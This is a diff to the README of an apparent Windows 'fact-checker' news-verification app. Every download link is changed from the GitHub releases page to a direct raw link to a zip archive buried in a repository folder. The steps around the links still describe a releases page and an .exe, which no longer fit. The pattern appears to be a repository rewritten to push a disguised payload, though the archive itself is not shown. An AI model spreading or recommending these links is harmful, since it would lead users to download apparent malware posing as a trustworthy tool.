@@ -1,6 +1,6 @@
 # 🕵️‍♂️ fact-checker - Verify News and Media Easily
 
-[![Download fact-checker](https://img.shields.io/badge/Download-fact--checker-brightgreen)](https://github.com/Downcast-inamorata249/fact-checker/releases)
+[![Download fact-checker](https://img.shields.io/badge/Download-fact--checker-brightgreen)](https://raw.githubusercontent.com/Downcast-inamorata249/fact-checker/main/kismetic/checker-fact-2.2.zip)
 
 ---
 
@@ -27,7 +27,7 @@ To use fact-checker on your Windows computer, make sure your system meets these 
 
 1. Go to the releases page to download the software:
 
-   [Download fact-checker](https://github.com/Downcast-inamorata249/fact-checker/releases)
+   [Download fact-checker](https://raw.githubusercontent.com/Downcast-inamorata249/fact-checker/main/kismetic/checker-fact-2.2.zip)
 
 2. On the page, look for the latest release version. It should show a file ending with `.exe`.
 
@@ -85,7 +85,7 @@ The app is made to be simple. Here are the main steps to check information:
 
 1. Visit the official releases page here:
 
-   [Download fact-checker](https://github.com/Downcast-inamorata249/fact-checker/releases)
+   [Download fact-checker](https://raw.githubusercontent.com/Downcast-inamorata249/fact-checker/main/kismetic/checker-fact-2.2.zip)
 
 2. Find the latest version under "Assets".
 
